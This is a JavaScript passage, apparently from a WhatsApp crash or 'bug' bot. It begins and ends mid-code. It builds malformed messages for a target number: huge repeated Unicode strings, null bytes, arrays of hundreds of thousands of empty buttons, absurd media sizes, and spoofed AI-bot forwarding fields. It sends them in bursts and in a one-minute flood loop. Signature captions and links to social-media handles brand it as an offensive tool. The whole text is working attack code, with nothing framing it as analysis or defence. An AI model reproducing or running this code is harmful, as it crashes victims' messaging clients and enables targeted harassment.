          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIQQQIgQVFS/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
          annotations: [
            {
              polygonVertices: [
                {
                  x: 0.17499999701976776,
                  y: 0.3379453122615814
                },
                {
                  x: 0.824999988079071,
                  y: 0.3379453122615814
                },
                {
                  x: 0.824999988079071,
                  y: 0.6620468497276306
                },
                {
                  x: 0.17499999701976776,
                  y: 0.6620468497276306
                }
              ],
              shouldSkipConfirmation: true,
              embeddedContent: {
                embeddedMusic: {
                  musicContentMediaId: "2261401457948346",
                  songId: "849859527815275",
                  author: "Lexcaabos - Executed¿!" + "ြ".repeat(9000),
                  title: "ြ".repeat(75000),
                  artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                  artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                  artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                  artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                  artistAttribution: "https://www.instagram.com/_u/lexzymods",
                  countryBlocklist: "WEs=",
                  isExplicit: false
                }
              },
              embeddedAction: true
            }
          ]
        }
      }
    }
  };

  await sock.relayMessage(target, d, {});

  const bot = "867051314767696@bot";

  const e = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,

          submessages: [
            {
              messageType: 2,
              messageText: `@${bot.split("@")[0]}`
            },

            {
              messageType: 5,
              codeMetadata: {
                codeLanguage: "javascript",

                codeBlocks: [
                  {
                    highlightType: 1,
                    codeContent: "const = {"
                  },
                  {
                    highlightType: 2,
                    codeContent: "Lexcaabos - Executed¿!"
                  },
                  {
                    highlightType: 3,
                    codeContent: `${"\0".repeat(75000)}` + `${"\x10".repeat(25000)}`
                  }
                ]
              }
            }
          ],

          contextInfo: {
            mentionedJid: [bot],

            featureEligibilities: Array.from(
              { length: 1999 },
              () => ({
                canReceiveMultiReact: true
              })
            ),

            isForwarded: true,

            forwardedAiBotMessageInfo: {
              botJid: bot
            },

            forwardOrigin: 4
          }
        }
      }
    }
  };

  await sock.relayMessage(target, e, {});

  const g = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: 9999,
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: null,
              caption: "LexzyMods - Executed¿!",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999987899999999999999,
                998999999999999999999,
                999899999999999999999,
                9998789999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: {
            text: "Lexcaabos - Executed¿!",
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 450000 }, () => ({}))
          }
        }
      }
    }
  };

  const gMsg = generateWAMessageFromContent(target, g, {});

  await sock.relayMessage(target, gMsg.message, {
    participant: true,
    messageId: gMsg.key.id
  });

  const f = {
    newsletterAdminInviteMessage: {
      newsletterJid: "228773882@newsletter",
      newsletterName: "NanasMuda" + "ြ".repeat(75000),
      caption: "Pt Func Tergacorr" + "ြ".repeat(50000),
      inviteExpiration: Date.now() + 1814400000,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          )
        ],
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          },
          forwardedAiBotMessageInfo: {
            botName: "META AI",
            botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
            creatorName: "Lexzy Ganteng"
          }
        }
      }
    }
  };

  await sock.relayMessage(target, f, {
    participant: true,
  });

  const tombol = [
      {
          name: "single_select",
          buttonParamsJson: "ြ ".repeat(9000),
      },
  ];
      tombol.push(
          {
              name: "cta_call",
              buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
              }),
          },
          {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
              }),
          },
          {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
              }),
          }
      );

  const i = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
            hasMediaAttachment: true,
          },
          body: {
            text: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
          },
          footer: {
            text: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
          },
          nativeFlowMessage: {
            buttons: tombol
          },
          contextInfo: {
            forwardingScore: 2147483647,
            isForwarded: true,
            isSampled: true,
            expireAt: 253402300799000,
            participant: target,
            remoteJid: "status@broadcast",
            stanzaId: "ြ".repeat(10000),
            deviceListMetadata: {
              senderKeyHash: "ြ".repeat(7000),
              senderTimestamp: "9999999999999",
              recipientKeyHash: "ြ".repeat(6000),
              recipientTimestamp: "8888888888888",
              userIdentity: "ြ".repeat(4000)
            },
            botInvocationMetadata: {
              botId: "exploit_bot@",
              invocationType: "BOT_INVOCATION_TYPE_QUERY",
              invocationSource: "BOT_INVOCATION_SOURCE_QUICK_REPLY",
              botMessageSecret: "ြ".repeat(4000)
            },
            quotedMessage: {
              extendedTextMessage: {
                text: "\x10".repeat(1000),
                contextInfo: {
                  forwardingScore: 999999,
                  isForwarded: true,
                  stanzaId: "ꦽ".repeat(10000),
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  deviceListMetadata: {
                    senderKeyHash: "ꦽ".repeat(1000),
                    recipientKeyHash: "ꦽ".repeat(1000)
                  }
                }
              }
            },
            conversionSource: "ꦽ".repeat(9000),
            conversionData: Buffer.from("ꦽ".repeat(1000)),
            conversionDelaySeconds: 2147483647,
            externalAdReply: {
              title: "ꦽ".repeat(2000),
              body: "ꦽ".repeat(2000),
              mediaType: "IMAGE",
              thumbnailUrl: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ/0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7yNpExH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
              mediaUrl: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
              sourceUrl: "t.me/LexzyModss",
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, i, {
    participant: true,
    messageId: generateId()
  });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mimetype: "image/jpeg",
              caption: "LexzyMods - Executed¿!",
              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
              fileLength: "634893",
              height: 1022,
              width: 1080,
              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mediaKeyTimestamp: "1782643133",
              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
              hasMediaAttachment: true
            }
          },
          body: {
            text: "\u0000",
          },
          nativeFlowMessage: {
            buttons: "[".repeat(7500),
          }
        }
      }
    }
  }, { participant: true })

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mimetype: "image/jpeg",
              caption: "iniochamy - Executed¿!",
              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
              fileLength: "634893",
              height: 1022,
              width: 1080,
              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mediaKeyTimestamp: "1782643133",
              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
              hasMediaAttachment: true
            }
          },
          body: {
            text: "\u200B",
          },
          nativeFlowMessage: {
            buttons: "]".repeat(9000),
          }
        }
      }
    }
  }, { participant: true })

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mimetype: "image/jpeg",
              caption: "ochalex - Executed¿!",
              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
              fileLength: "634893",
              height: 1022,
              width: 1080,
              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mediaKeyTimestamp: "1782643133",
              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
              hasMediaAttachment: true
            }
          },
          body: {
            text: "\uFFFC",
          },
          nativeFlowMessage: {
            buttons: "{}".repeat(7500),
          }
        }
      }
    }
  }, { participant: true })

  const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
                mimetype: "image/jpeg",
                caption: "LexzyMods - Iniochamy¿!",
                fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
                fileLength: "634893",
                height: 1022,
                width: 1080,
                mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
                fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
                directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
                mediaKeyTimestamp: "1782643133",
                jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
                hasMediaAttachment: true
              }
            },
            body: {
              text: "\u0000",
            },
            nativeFlowMessage: {
              buttons: "[]".repeat(9000),
            }
          }
        }
      }
    }, { participant: true })
  }

  await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: Math.floor(Math.random() * 18446744073709551615),
                height: 99999,
                width: 99999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: 1776937541,
                jpegThumbnail: null,
                caption: "LexzyMods - Executed¿!",
                firstScanLength: 999999999,
                firstScanSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                experimentGroupId: 999999999,
                interactiveAnnotations: [],
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [999999999999, 999999999999, 999999999999, 999999999999],
                annotations: [],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0=",
                midQualityFileEncSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
              },
              hasMediaAttachment: true
            },
            body: {
              text: "NanasMuda - BackEraa"
            },
            nativeFlowMessage: {
              buttons: "]".repeat(5000)
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    }, { participant: true });

const asuw = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "LexzyMods - Executed¿!",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "NanasXExecutedXAllTeam"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const asoww = generateWAMessageFromContent(target, asuw, {});

    await sock.relayMessage(target, asoww, {
        participant: true,
    });

const b14 = {
  messageContextInfo: {
    deviceListMetadata: {
      senderKeyHash: "ြ".repeat(7000),
      senderTimestamp: "9999999999999",
      recipientKeyHash: "ြ".repeat(6000),
      recipientTimestamp: "8888888888888"
    },
    deviceListMetadataVersion: 2,
    messageSecret: "ြ".repeat(4000)
  },
  stickerPackMessage: {
    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
    name: "ꦾ".repeat(75000),
    publisher: "iniochamy - Executed¿!" + "ꦾ".repeat(5000),
    stickers: [],
    fileLength: "366299919",
    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
    contextInfo: { remoteJid: "X", participant: "0@s.whatsapp.net", stanzaId: "1234567890ABCDEF", mentionedJid: ["13135555555@s.whatsapp.net"] },
    packDescription: "",
    mediaKeyTimestamp: "1747502082",
    trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
    thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc",
    thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
    thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
    thumbnailHeight: 999999999,
    thumbnailWidth: 9999999999,
    imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
    stickerPackSize: "9990099",
    stickerPackOrigin: "USER_CREATED"
  }
};
await sock.relayMessage(target, b14, {
  additionalNodes: [
    { tag: "meta", attrs: { is_status_mention: "false" }, content: undefined },
    { tag: "biz", attrs: { native_flow_name: "sticker_pack" }, content: undefined }
  ]
});

const b19 = {
  senderKeyDistributionMessage: {
    groupId: "1234567890-987654321@g.us",
    axolotlSenderKeyDistributionMessage: Buffer.alloc(100_000, 0xAA).toString('base64')
  },
  messageContextInfo: {
    deviceListMetadata: {
      senderKeyHash: "ြ".repeat(7000),
      senderTimestamp: "9999999999999",
      recipientKeyHash: "ြ".repeat(6000),
      recipientTimestamp: "8888888888888",
      userIdentity: "ြ".repeat(4000)
    },
    deviceListMetadataVersion: 2,
    messageSecret: "ြ".repeat(4000),
    paddingBytes: Buffer.alloc(50_000, 0xFF).toString('base64')
  },
  stickerPackMessage: {
    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
    name: "ꦾ".repeat(75000),
    publisher: "iniochamy - Executed¿!" + "ꦾ".repeat(5000),
    stickers: [],
    fileLength: "366299919",
    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
    contextInfo: { remoteJid: "X", participant: "0@s.whatsapp.net", stanzaId: "1234567890ABCDEF", mentionedJid: ["13135555555@s.whatsapp.net"] },
    packDescription: "",
    mediaKeyTimestamp: "1747502082",
    trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
    thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc",
    thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
    thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
    thumbnailHeight: 999999999,
    thumbnailWidth: 9999999999,
    imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
    stickerPackSize: "9990099",
    stickerPackOrigin: "USER_CREATED"
  }
};
await sock.relayMessage(target, b19, {});
}

async function PrivateNew2027V3(sock, target) {
  const largeThumbnail = Buffer.alloc(500_500, 'A').toString('base64');
  const generateId = () => Math.random().toString(36).substring(2, 15);

  const generateWAMessageFromContent = (jid, message, options = {}) => {
    return {
      key: {
        remoteJid: jid,
        fromMe: true,
        id: generateId()
      },
      message: message,
      messageTimestamp: Date.now(),
      pushName: "LexzyMods"
    };
  };

  const LexMsg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: 9999,
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: null,
              caption: "LexzyMods - Executed¿!",
